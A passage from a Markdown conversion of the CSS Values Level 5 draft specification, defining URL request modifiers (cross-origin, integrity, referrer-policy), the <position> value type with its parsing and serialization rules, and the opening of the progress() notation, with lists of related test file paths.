<referrer-policy-modifier> = referrer-policy(no-referrer | no-referrer-when-downgrade | same-origin | origin | strict-origin | origin-when-cross-origin | strict-origin-when-cross-origin | unsafe-url)
```
<a id="ref-for-typedef-request-url-modifier-cross-origin-modifier②"></a>

<a id="typedef-request-url-modifier-cross-origin-modifier"></a>[\<cross-origin-modifier\>](#typedef-request-url-modifier-cross-origin-modifier) = <a id="funcdef-request-url-modifier-cross-origin"></a>cross-origin(<a id="valdef-request-url-modifier-anonymous"></a>anonymous \| <a id="valdef-request-url-modifier-use-credentials"></a>use-credentials)

<a id="ref-for-concept-request①"></a>

<a id="ref-for-url-request-modifier-steps①"></a>

The [URL request modifier steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps) for this modifier given [request](https://fetch.spec.whatwg.org/#concept-request) <var>req</var> are:

1.  <a id="ref-for-concept-request-mode"></a>

    Set <var>req</var>’s [mode](https://fetch.spec.whatwg.org/#concept-request-mode) to "cors".

2.  <a id="ref-for-valdef-request-url-modifier-use-credentials"></a>

    <a id="ref-for-concept-request-credentials-mode"></a>

    If the given value is [use-credentials](#valdef-request-url-modifier-use-credentials), set <var>req</var>’s [credentials mode](https://fetch.spec.whatwg.org/#concept-request-credentials-mode) to "include".

3.  <a id="ref-for-concept-request-credentials-mode①"></a>

    Otherwise, set <var>req</var>’s [credentials mode](https://fetch.spec.whatwg.org/#concept-request-credentials-mode) to "same-origin".

<a id="ref-for-string-value④"></a>

<a id="ref-for-typedef-request-url-modifier-integrity-modifier②"></a>

<a id="typedef-request-url-modifier-integrity-modifier"></a>[\<integrity-modifier\>](#typedef-request-url-modifier-integrity-modifier) = <a id="funcdef-request-url-modifier-integrity"></a>integrity([\<string\>](https://drafts.csswg.org/css-values-4/#string-value))

<a id="ref-for-string-value⑤"></a>

<a id="ref-for-concept-request-integrity-metadata"></a>

<a id="ref-for-concept-request②"></a>

<a id="ref-for-url-request-modifier-steps②"></a>

The [URL request modifier steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps) for this modifier given [request](https://fetch.spec.whatwg.org/#concept-request) <var>req</var> are to set <a id="ref-for-concept-request③"></a>request’s [integrity metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata) to the given [\<string\>](https://drafts.csswg.org/css-values-4/#string-value).

<a id="ref-for-typedef-request-url-modifier-referrer-policy-modifier②"></a>

<a id="typedef-request-url-modifier-referrer-policy-modifier"></a>[\<referrer-policy-modifier\>](#typedef-request-url-modifier-referrer-policy-modifier) = <a id="funcdef-request-url-modifier-referrer-policy"></a>referrer-policy(<a id="valdef-request-url-modifier-no-referrer"></a>no-referrer \| <a id="valdef-request-url-modifier-no-referrer-when-downgrade"></a>no-referrer-when-downgrade \| <a id="valdef-request-url-modifier-same-origin"></a>same-origin \| <a id="valdef-request-url-modifier-origin"></a>origin \| <a id="valdef-request-url-modifier-strict-origin"></a>strict-origin \| <a id="valdef-request-url-modifier-origin-when-cross-origin"></a>origin-when-cross-origin \| <a id="valdef-request-url-modifier-strict-origin-when-cross-origin"></a>strict-origin-when-cross-origin \| <a id="valdef-request-url-modifier-unsafe-url"></a>unsafe-url)

<a id="ref-for-enumdef-referrerpolicy"></a>

<a id="ref-for-concept-request-referrer-policy"></a>

<a id="ref-for-concept-request④"></a>

<a id="ref-for-url-request-modifier-steps③"></a>

The [URL request modifier steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps) for this modifier given [request](https://fetch.spec.whatwg.org/#concept-request) <var>req</var> are to set <a id="ref-for-concept-request⑤"></a>request’s [referrer policy](https://fetch.spec.whatwg.org/#concept-request-referrer-policy) to the <code><a href="https://w3c.github.io/webappsec-referrer-policy/#enumdef-referrerpolicy">ReferrerPolicy</a></code> that matches the given value.

<a id="ref-for-concept-request⑥"></a>

<a id="ref-for-url-value②"></a>

<a id="ref-for-url-request-modifier-steps④"></a>

<a id="ref-for-typedef-request-url-modifier③"></a>

To <a id="apply-request-modifiers-from-url-value"></a>apply request modifiers from URL value given a [request](https://fetch.spec.whatwg.org/#concept-request) <var>req</var> and a [\<url\>](https://drafts.csswg.org/css-values-4/#url-value) <var>url</var>, call the [URL request modifier steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps) for <var>url</var>’s [\<request-url-modifier\>](#typedef-request-url-modifier)s in sequence given <var>req</var>.

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/urls/cross-origin/url-font-cross-origin-anonymous-negative.sub.html`
- `css/css-values/urls/cross-origin/url-font-cross-origin-anonymous.sub.html`
- `css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials-negative.sub.html`
- `css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials.sub.html`
- `css/css-values/urls/cross-origin/url-image-cross-origin-anonymous-negative.sub.html`
- `css/css-values/urls/cross-origin/url-image-cross-origin-anonymous.sub.html`
- `css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials-negative.sub.html`
- `css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials.sub.html`
- `css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous-negative.sub.html`
- `css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous.sub.html`
- `css/css-values/urls/cross-origin/url-import-cross-origin-anonymous-negative.sub.html`
- `css/css-values/urls/cross-origin/url-import-cross-origin-anonymous.sub.html`
- `css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials-negative.sub.html`
- `css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials.sub.html`
- `css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous-negative.sub.html`
- `css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous.sub.html`
- `css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials-negative.sub.html`
- `css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials.sub.html`
- `css/css-values/urls/integrity/url-font-integrity-negative.sub.html`
- `css/css-values/urls/integrity/url-font-integrity.sub.html`
- `css/css-values/urls/integrity/url-image-integrity-negative.sub.html`
- `css/css-values/urls/integrity/url-image-integrity.sub.html`
- `css/css-values/urls/integrity/url-import-integrity-negative.sub.html`
- `css/css-values/urls/integrity/url-import-integrity.sub.html`
- `css/css-values/urls/integrity/url-svg-filter-integrity-negative.sub.html`
- `css/css-values/urls/integrity/url-svg-filter-integrity.sub.html`
- `css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-cross-origin.html`
- `css/css-values/urls/referrer-policy/no-referrer-when-downgrade/url-image-referrer-policy-same-origin.html`
- `css/css-values/urls/referrer-policy/no-referrer/url-font-referrer-policy.sub.html`
- `css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-cross-origin.html`
- `css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-external-stylesheet.html`
- `css/css-values/urls/referrer-policy/no-referrer/url-image-referrer-policy-same-origin.html`
- `css/css-values/urls/referrer-policy/no-referrer/url-image-set-referrer-policy.sub.html`
- `css/css-values/urls/referrer-policy/no-referrer/url-import-referrer-policy.html`
- `css/css-values/urls/referrer-policy/no-referrer/url-svg-filter-referrer-policy.sub.html`
- `css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-cross-origin.html`
- `css/css-values/urls/referrer-policy/origin-when-cross-origin/url-image-referrer-policy-same-origin.html`
- `css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-cross-origin.html`
- `css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-external-stylesheet.html`
- `css/css-values/urls/referrer-policy/origin/url-image-referrer-policy-same-origin.html`
- `css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-cross-origin.html`
- `css/css-values/urls/referrer-policy/same-origin/url-image-referrer-policy-same-origin.html`
- `css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-cross-origin.html`
- `css/css-values/urls/referrer-policy/strict-origin-when-cross-origin/url-image-referrer-policy-same-origin.html`
- `css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-cross-origin.html`
- `css/css-values/urls/referrer-policy/strict-origin/url-image-referrer-policy-same-origin.html`
- `css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-cross-origin.html`
- `css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-external-stylesheet.html`
- `css/css-values/urls/referrer-policy/unsafe-url/url-image-referrer-policy-same-origin.html`
- `css/css-values/urls/url-request-modifiers-computed.sub.html`
- `css/css-values/urls/url-request-modifiers-font-face-parsing.html`
- `css/css-values/urls/url-request-modifiers-import-parsing.sub.html`
- `css/css-values/urls/url-request-modifiers-invalid.sub.html`
- `css/css-values/urls/url-request-modifiers-serialize.sub.html`

<a id="ref-for-typedef-position"></a>

### <a id="position"></a>4.2.  2D Positioning: the [\<position\>](#typedef-position) type

<a id="ref-for-typedef-position①"></a>

<a id="ref-for-alignment-subject"></a>

<a id="ref-for-alignment-container"></a>

<a id="ref-for-background-positioning-area"></a>

The <a id="typedef-position"></a>[\<position\>](#typedef-position) value specifies the position of an [alignment subject](https://drafts.csswg.org/css-align-3/#alignment-subject) (e.g. a background image) inside an [alignment container](https://drafts.csswg.org/css-align-3/#alignment-container) (e.g. its [background positioning area](https://drafts.csswg.org/css-backgrounds-3/#background-positioning-area)) as a pair of offsets between the specified edges (defaulting to the left and top). Its syntax is:

<a id="ref-for-typedef-position②"></a>

<a id="ref-for-typedef-position-one"></a>

<a id="ref-for-comb-one③⑦"></a>

<a id="ref-for-typedef-position-two"></a>

<a id="ref-for-comb-one③⑧"></a>

<a id="ref-for-typedef-position-four"></a>

<a id="typedef-position-one"></a>

<a id="ref-for-typedef-position-one①"></a>

<a id="ref-for-comb-one③⑨"></a>

<a id="ref-for-comb-one④⓪"></a>

<a id="ref-for-comb-one④①"></a>

<a id="ref-for-comb-one④②"></a>

<a id="ref-for-comb-one④③"></a>

<a id="ref-for-comb-one④④"></a>

<a id="ref-for-comb-one④⑤"></a>

<a id="ref-for-comb-one④⑥"></a>

<a id="ref-for-comb-one④⑦"></a>

<a id="ref-for-comb-one④⑧"></a>

<a id="ref-for-comb-one④⑨"></a>

<a id="ref-for-comb-one⑤⓪"></a>

<a id="ref-for-comb-one⑤①"></a>

<a id="ref-for-typedef-length-percentage"></a>

<a id="typedef-position-two"></a>

<a id="ref-for-typedef-position-two①"></a>

<a id="ref-for-comb-one⑤②"></a>

<a id="ref-for-comb-one⑤③"></a>

<a id="ref-for-comb-one⑤④"></a>

<a id="ref-for-comb-one⑤⑤"></a>

<a id="ref-for-comb-all"></a>

<a id="ref-for-comb-one⑤⑥"></a>

<a id="ref-for-comb-one⑤⑦"></a>

<a id="ref-for-comb-one⑤⑧"></a>

<a id="ref-for-comb-one⑤⑨"></a>

<a id="ref-for-comb-one⑥⓪"></a>

<a id="ref-for-comb-one⑥①"></a>

<a id="ref-for-comb-one⑥②"></a>

<a id="ref-for-comb-one⑥③"></a>

<a id="ref-for-comb-one⑥④"></a>

<a id="ref-for-comb-one⑥⑤"></a>

<a id="ref-for-typedef-length-percentage①"></a>

<a id="ref-for-comb-one⑥⑥"></a>

<a id="ref-for-comb-one⑥⑦"></a>

<a id="ref-for-comb-one⑥⑧"></a>

<a id="ref-for-comb-one⑥⑨"></a>

<a id="ref-for-comb-one⑦⓪"></a>

<a id="ref-for-typedef-length-percentage②"></a>

<a id="ref-for-comb-one⑦①"></a>

<a id="ref-for-comb-one⑦②"></a>

<a id="ref-for-comb-one⑦③"></a>

<a id="ref-for-comb-all①"></a>

<a id="ref-for-comb-one⑦④"></a>

<a id="ref-for-comb-one⑦⑤"></a>

<a id="ref-for-comb-one⑦⑥"></a>

<a id="ref-for-comb-one⑦⑦"></a>

<a id="ref-for-comb-one⑦⑧"></a>

<a id="ref-for-mult-num"></a>

<a id="typedef-position-four"></a>

<a id="ref-for-typedef-position-four①"></a>

<a id="ref-for-comb-one⑦⑨"></a>

<a id="ref-for-comb-one⑧⓪"></a>

<a id="ref-for-comb-one⑧①"></a>

<a id="ref-for-typedef-length-percentage③"></a>

<a id="ref-for-comb-all②"></a>

<a id="ref-for-comb-one⑧②"></a>

<a id="ref-for-comb-one⑧③"></a>

<a id="ref-for-comb-one⑧④"></a>

<a id="ref-for-typedef-length-percentage④"></a>

<a id="ref-for-comb-one⑧⑤"></a>

<a id="ref-for-comb-one⑧⑥"></a>

<a id="ref-for-typedef-length-percentage⑤"></a>

<a id="ref-for-comb-all③"></a>

<a id="ref-for-comb-one⑧⑦"></a>

<a id="ref-for-typedef-length-percentage⑥"></a>

<a id="ref-for-comb-one⑧⑧"></a>

<a id="ref-for-comb-one⑧⑨"></a>

<a id="ref-for-typedef-length-percentage⑦"></a>

<a id="ref-for-mult-num①"></a>

```text
<position> = <position-one> | <position-two> | <position-four>
<position-one> = [
  left | center | right | top | bottom |
  x-start | x-end | y-start | y-end |
  block-start | block-end | inline-start | inline-end |
  <length-percentage>
]
<position-two> = [
  [ left | center | right | x-start | x-end ] &&
  [ top | center | bottom | y-start | y-end ]
|
  [ left | center | right | x-start | x-end | <length-percentage> ]
  [ top | center | bottom | y-start | y-end | <length-percentage> ]
|
  [ block-start | center | block-end ] &&
  [ inline-start | center | inline-end ]
|
  [ start | center | end ]{2}
]
<position-four> = [
  [ [ left | right | x-start | x-end ] <length-percentage> ] &&
  [ [ top | bottom | y-start | y-end ] <length-percentage> ]
|
  [ [ block-start | block-end ] <length-percentage> ] &&
  [ [ inline-start | inline-end ] <length-percentage> ]
|
  [ [ start | end ] <length-percentage> ]{2}
]
```
<a id="ref-for-typedef-position-one②"></a>

<a id="ref-for-valdef-position-center"></a>

If only one value is specified ([\<position-one\>](#typedef-position-one)), the second value is assumed to be [center](#valdef-position-center).

<a id="ref-for-typedef-position-two②"></a>

<a id="ref-for-typedef-length-percentage⑧"></a>

<a id="ref-for-alignment-subject①"></a>

<a id="ref-for-alignment-container①"></a>

If two values are given ([\<position-two\>](#typedef-position-two)), a [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) as the first value represents the horizontal position as the offset between the left edges of the [alignment subject](https://drafts.csswg.org/css-align-3/#alignment-subject) and [alignment container](https://drafts.csswg.org/css-align-3/#alignment-container), and a <a id="ref-for-typedef-length-percentage⑨"></a>\<length-percentage\> as the second value represents the vertical position as an offset between their top edges.

<a id="ref-for-block-axis"></a>

<a id="ref-for-inline-axis"></a>

If both keywords are one of start or end, the first one represents the [block axis](https://drafts.csswg.org/css-writing-modes-4/#block-axis) and the second the [inline axis](https://drafts.csswg.org/css-writing-modes-4/#inline-axis).

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: A pair of axis-specific keywords can be reordered, while a combination of keyword and length or percentage cannot. So center left or inline-start block-end is valid, while 50% left is not. start and end aren’t axis-specific, so start end and end start represent two different positions.

<a id="ref-for-typedef-position-four②"></a>

<a id="ref-for-typedef-length-percentage①⓪"></a>

<a id="ref-for-propdef-background-position"></a>

If four values are given ([\<position-four\>](#typedef-position-four)) then each [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) represents an offset between the edges specified by the preceding keyword. For example, [background-position: bottom 10px right 20px](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) represents a 10px vertical offset up from the bottom edge and a 20px horizontal offset leftward from the right edge.

<a id="ref-for-alignment-container②"></a>

Positive values represent an offset <em>inward</em> from the edge of the [alignment container](https://drafts.csswg.org/css-align-3/#alignment-container). Negative values represent an offset <em>outward</em> from the edge of the <a id="ref-for-alignment-container③"></a>alignment container.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-0b808127"></a> The following declarations give the stated (horizontal, vertical) offsets from the top left corner:
>
> ```text
> background-position: left 10px top 15px;   /* 10px, 15px */
> background-position: left      top     ;   /*  0px,  0px */
> background-position:      10px     15px;   /* 10px, 15px */
> background-position: left          15px;   /*  0px, 15px */
> background-position:      10px top     ;   /* 10px,  0px */
> ```
<a id="ref-for-typedef-position③"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-88922ca3"></a> [\<position\>](#typedef-position)s can also be relative to other corners than the top left. For example, the following puts the background image 10px from the bottom and 3em from the right:
>
> ```text
> background-position: right 3em bottom 10px
> ```
<a id="ref-for-computed-value①"></a>

<a id="ref-for-typedef-position④"></a>

<a id="ref-for-typedef-length-percentage①①"></a>

<a id="ref-for-alignment-subject②"></a>

<a id="ref-for-alignment-container④"></a>

The [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a [\<position\>](#typedef-position) is a pair of offsets (horizontal and vertical), each given as a computed [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) value, representing the distance between the left edges and top edges (respectively) of the [alignment subject](https://drafts.csswg.org/css-align-3/#alignment-subject) and [alignment container](https://drafts.csswg.org/css-align-3/#alignment-container).

<a id="ref-for-typedef-length-percentage①②"></a>

<a id="valdef-position-length-percentage"></a>[\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage)

<a id="ref-for-alignment-container⑤"></a>

<a id="ref-for-alignment-subject③"></a>

<a id="ref-for-typedef-length-percentage①③"></a>

A [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) value specifies the size of the offset between the specified edges of the [alignment subject](https://drafts.csswg.org/css-align-3/#alignment-subject) and [alignment container](https://drafts.csswg.org/css-align-3/#alignment-container).

<a id="ref-for-propdef-background-position①"></a>

<a id="ref-for-background-positioning-area①"></a>

For example, for [background-position: 2cm 1cm](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position), the top left corner of the background image is placed 2cm to the right and 1cm below the top left corner of the [background positioning area](https://drafts.csswg.org/css-backgrounds-3/#background-positioning-area).

<a id="ref-for-percentage-value①"></a>

<a id="ref-for-alignment-container⑥"></a>

<a id="ref-for-alignment-subject④"></a>

<a id="ref-for-alignment-container⑦"></a>

<a id="ref-for-alignment-subject⑤"></a>

A [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) for the horizontal offset is relative to (<var>width of <a href="https://drafts.csswg.org/css-align-3/#alignment-container">alignment container</a></var> - <var>width of <a href="https://drafts.csswg.org/css-align-3/#alignment-subject">alignment subject</a></var>). A <a id="ref-for-percentage-value②"></a>\<percentage\> for the vertical offset is relative to (<var>height of <a href="https://drafts.csswg.org/css-align-3/#alignment-container">alignment container</a></var> - <var>height of <a href="https://drafts.csswg.org/css-align-3/#alignment-subject">alignment subject</a></var>).

<a id="ref-for-alignment-subject⑥"></a>

<a id="ref-for-alignment-container⑧"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-0fd7dab3"></a> For example, with a value pair of 0% 0%, the upper left corner of the [alignment subject](https://drafts.csswg.org/css-align-3/#alignment-subject) is aligned with the upper left corner of the [alignment container](https://drafts.csswg.org/css-align-3/#alignment-container) A value pair of 100% 100% places the lower right corner of the <a id="ref-for-alignment-subject⑦"></a>alignment subject in the lower right corner of the <a id="ref-for-alignment-container⑨"></a>alignment container. With a value pair of 75% 50%, the point 75% across and 50% down the <a id="ref-for-alignment-subject⑧"></a>alignment subject is to be placed at the point 75% across and 50% down the <a id="ref-for-alignment-container①⓪"></a>alignment container.
>
> ![Diagram of image position within element](https://raw.githubusercontent.com/w3c/csswg-drafts/23abdab4aba7521d84efc6428466618222de1bd6/css-values-5/images/bg-pos.png)
>
> <a id="ref-for-propdef-background-position②"></a>
>
> Diagram of the meaning of [background-position: 75% 50%](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position).

<a id="valdef-position-top"></a>top

<a id="valdef-position-right"></a>right

<a id="valdef-position-bottom"></a>bottom

<a id="valdef-position-left"></a>left

<a id="ref-for-alignment-container①①"></a>

<a id="ref-for-alignment-subject⑨"></a>

Offsets the top/left/right/bottom edges (respectively) of the [alignment subject](https://drafts.csswg.org/css-align-3/#alignment-subject) and [alignment container](https://drafts.csswg.org/css-align-3/#alignment-container) by the specified amount (defaulting to 0%) in the corresponding axis.

<a id="valdef-position-y-start"></a>y-start

<a id="valdef-position-y-end"></a>y-end

<a id="valdef-position-x-start"></a>x-start

<a id="valdef-position-x-end"></a>x-end

<a id="ref-for-x-axis"></a>

<a id="ref-for-y-axis"></a>

<a id="ref-for-css-end"></a>

<a id="ref-for-css-start"></a>

Computes the same as the physical edge keyword corresponding to the [start](https://drafts.csswg.org/css-writing-modes-4/#css-start)/[end](https://drafts.csswg.org/css-writing-modes-4/#css-end) side in the [y](https://drafts.csswg.org/css-writing-modes-4/#y-axis)/[x](https://drafts.csswg.org/css-writing-modes-4/#x-axis) axis.

<a id="valdef-position-block-start"></a>block-start

<a id="valdef-position-block-end"></a>block-end

<a id="valdef-position-inline-start"></a>inline-start

<a id="valdef-position-inline-end"></a>inline-end

<a id="ref-for-inline-axis①"></a>

<a id="ref-for-block-axis①"></a>

<a id="ref-for-css-end①"></a>

<a id="ref-for-css-start①"></a>

Computes the same as the physical edge keyword corresponding to the [start](https://drafts.csswg.org/css-writing-modes-4/#css-start)/[end](https://drafts.csswg.org/css-writing-modes-4/#css-end) side in the [block](https://drafts.csswg.org/css-writing-modes-4/#block-axis)/[inline](https://drafts.csswg.org/css-writing-modes-4/#inline-axis) axis.

<a id="valdef-position-center"></a>center

Computes to a 50% offset in the corresponding axis.

<a id="ref-for-flow-relative"></a>

<a id="ref-for-writing-mode"></a>

Unless otherwise specified, the [flow-relative](https://drafts.csswg.org/css-writing-modes-4/#flow-relative) keywords are resolved according to the [writing mode](https://drafts.csswg.org/css-writing-modes-4/#writing-mode) of the element on which the value is specified.

<a id="ref-for-propdef-background-position③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [background-position](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) property also accepts a three-value syntax. This has been disallowed generically because it creates parsing ambiguities when combined with other length or percentage components in a property value.

<a id="ref-for-propdef-background-position④"></a>

<a id="ref-for-funcdef-var②"></a>

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-8e940682"></a> Need to define how this syntax would expand to the longhands of [background-position](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-position) if e.g. [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) is used for some (or all) of the components. [\[Issue \#9690\]](https://github.com/w3c/csswg-drafts/issues/9690)

<a id="ref-for-typedef-position⑤"></a>

#### <a id="position-parsing"></a>4.2.1.  Parsing [\<position\>](#typedef-position)

<a id="ref-for-length-value①"></a>

<a id="ref-for-percentage-value③"></a>

<a id="ref-for-typedef-position⑥"></a>

When specified in a grammar alongside other keywords, [\<length\>](https://drafts.csswg.org/css-values-4/#length-value)s, or [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value)s, [\<position\>](#typedef-position) is <em>greedily</em> parsed; it consumes as many components as possible.

<a id="ref-for-propdef-transform-origin"></a>

<a id="ref-for-typedef-position⑦"></a>

<a id="ref-for-length-value②"></a>

<a id="ref-for-typedef-position⑧"></a>

<a id="ref-for-length-value③"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-2622a7d7"></a> For example, [transform-origin](https://drafts.csswg.org/css-transforms-1/#propdef-transform-origin) defines a 3D position as (effectively) [\<position\>](#typedef-position) [\<length\>](https://drafts.csswg.org/css-values-4/#length-value)?. A value such as left 50px will be parsed as a 2-value [\<position\>](#typedef-position), with an omitted z-component; on the other hand, a value such as top 50px will be parsed as a single-value <a id="ref-for-typedef-position⑨"></a>\<position\> followed by a [\<length\>](https://drafts.csswg.org/css-values-4/#length-value).

<a id="ref-for-typedef-position①⓪"></a>

#### <a id="position-serialization"></a>4.2.2.  Serializing [\<position\>](#typedef-position)

<a id="ref-for-specified-value"></a>

<a id="ref-for-typedef-position①①"></a>

When serializing the [specified value](https://drafts.csswg.org/css-cascade-5/#specified-value) of a [\<position\>](#typedef-position):

If only one component is specified:  
- <a id="ref-for-valdef-background-position-center"></a>

  The implied [center](https://drafts.csswg.org/css-backgrounds-3/#valdef-background-position-center) keyword is added, and a 2-component value is serialized.

If two components are specified:  
- Keywords are serialized as keywords.

- <a id="ref-for-typedef-length-percentage①④"></a>

  [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage)s are serialized as <a id="ref-for-typedef-length-percentage①⑤"></a>\<length-percentage\>s.

- Components are serialized horizontal first, then vertical.

If four components are specified:  
- Keywords and offsets are both serialized.

- <a id="ref-for-block-axis②"></a>

  <a id="ref-for-inline-axis②"></a>

  Components are serialized horizontal first, then vertical; alternatively [block-axis](https://drafts.csswg.org/css-writing-modes-4/#block-axis) first, then [inline-axis](https://drafts.csswg.org/css-writing-modes-4/#inline-axis).

<a id="ref-for-typedef-position①②"></a>

<a id="ref-for-length-value④"></a>

<a id="ref-for-propdef-transform-origin①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: [\<position\>](#typedef-position) values are never serialized as a single value, even when a single value would produce the same behavior, to avoid causing parsing ambiguities in some grammars where a <a id="ref-for-typedef-position①③"></a>\<position\> is placed next to a [\<length\>](https://drafts.csswg.org/css-values-4/#length-value), such as [transform-origin](https://drafts.csswg.org/css-transforms-1/#propdef-transform-origin).

<a id="ref-for-computed-value②"></a>

<a id="ref-for-typedef-position①④"></a>

<a id="ref-for-typedef-length-percentage①⑥"></a>

The [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) of a [\<position\>](#typedef-position) is serialized as a pair of [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage)s representing offsets from the left and top edges, in that order.

<a id="ref-for-typedef-position①⑤"></a>

#### <a id="combine-positions"></a>4.2.3.  Combination of [\<position\>](#typedef-position)

<a id="ref-for-interpolation"></a>

<a id="ref-for-typedef-position①⑥"></a>

<a id="ref-for-typedef-length-percentage①⑦"></a>

[Interpolation](https://drafts.csswg.org/css-values-4/#interpolation) of [\<position\>](#typedef-position) is defined as the independent interpolation of each component (x, y) normalized as an offset from the top left corner as a [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage).

<a id="ref-for-addition"></a>

<a id="ref-for-typedef-position①⑦"></a>

<a id="ref-for-typedef-length-percentage①⑧"></a>

[Addition](https://drafts.csswg.org/css-values-4/#addition) of [\<position\>](#typedef-position) is likewise defined as the independent <a id="ref-for-addition①"></a>addition each component (x, y) normalized as an offset from the top left corner as a [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage).

<a id="ref-for-funcdef-progress"></a>

## <a id="progress"></a>5. <a id="progress-func"></a> Interpolation Progress Calculations: the [progress()](#funcdef-progress) notation

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/progress-computed.html`
- `css/css-values/progress-invalid.html`
- `css/css-values/progress-serialize.html`

<a id="ref-for-functional-notation②"></a>

<a id="ref-for-calc-calculation"></a>

<a id="ref-for-math-function"></a>

<a id="ref-for-mix-notations"></a>

<a id="ref-for-funcdef-progress①"></a>

The <a id="funcdef-progress"></a>progress() [functional notation](https://drafts.csswg.org/css-values-4/#functional-notation) represents the proportional distance of a given value (the <a id="progress-value"></a>progress value) from one value (the <a id="progress-start-value"></a>progress start value) to another value (the <a id="progress-end-value"></a>progress end value), each represented as a [calculation](https://drafts.csswg.org/css-values-4/#calc-calculation). It is a [math function](https://drafts.csswg.org/css-values-4/#math-function), and can be input into other calculations such as a <a id="ref-for-math-function①"></a>math function or a [mix notation](#mix-notations). The syntax of [progress()](#funcdef-progress) is:

<a id="ref-for-funcdef-progress②"></a>

<a id="ref-for-mult-opt①"></a>

<a id="ref-for-typedef-calc-sum"></a>

<a id="ref-for-comb-comma"></a>

<a id="ref-for-typedef-calc-sum①"></a>

<a id="ref-for-comb-comma①"></a>

<a id="ref-for-typedef-calc-sum②"></a>

```text
<progress()> = progress(no-clamp? <calc-sum>, <calc-sum>, <calc-sum>)
```
<a id="ref-for-typedef-calc-sum③"></a>

<a id="ref-for-progress-value"></a>

<a id="ref-for-progress-start-value"></a>

<a id="ref-for-progress-end-value"></a>

where the first, second, and third [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) values represent the [progress value](#progress-value), [progress start value](#progress-start-value), and [progress end value](#progress-end-value), respectively.

<a id="ref-for-funcdef-progress③"></a>

If <a id="valdef-progress-no-clamp"></a>no-clamp is present, the [progress()](#funcdef-progress) function can potentially resolve to any number; if omitted (the default), the return value is clamped to the range \[0, 1\].

<a id="ref-for-calc-calculation①"></a>

<a id="ref-for-number-value①"></a>

<a id="ref-for-typedef-dimension"></a>

<a id="ref-for-percentage-value④"></a>

<a id="ref-for-css-consistent-type"></a>

The argument [calculations](https://drafts.csswg.org/css-values-4/#calc-calculation) can resolve to any [\<number\>](https://drafts.csswg.org/css-values-4/#number-value), [\<dimension\>](https://drafts.csswg.org/css-values-4/#typedef-dimension), or [\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value), but must have a [consistent type](https://drafts.csswg.org/css-values-4/#css-consistent-type) or else the function is invalid.

<a id="ref-for-funcdef-progress④"></a>

<a id="ref-for-number-value②"></a>

<a id="ref-for-css-make-a-type-consistent"></a>

<a id="ref-for-css-consistent-type①"></a>

The result of [progress()](#funcdef-progress) is a [\<number\>](https://drafts.csswg.org/css-values-4/#number-value) [made consistent](https://drafts.csswg.org/css-values-4/#css-make-a-type-consistent) with the [consistent type](https://drafts.csswg.org/css-values-4/#css-consistent-type) of its arguments, resolved by <a id="calculate-a-progress-function"></a>calculating a progress function as follows:

<a id="ref-for-progress-end-value①"></a>

<a id="ref-for-progress-start-value①"></a>

If the [progress start value](#progress-start-value) and [progress end value](#progress-end-value) are different values

<a id="ref-for-progress-value①"></a>

<a id="ref-for-progress-start-value②"></a>

<a id="ref-for-progress-end-value②"></a>

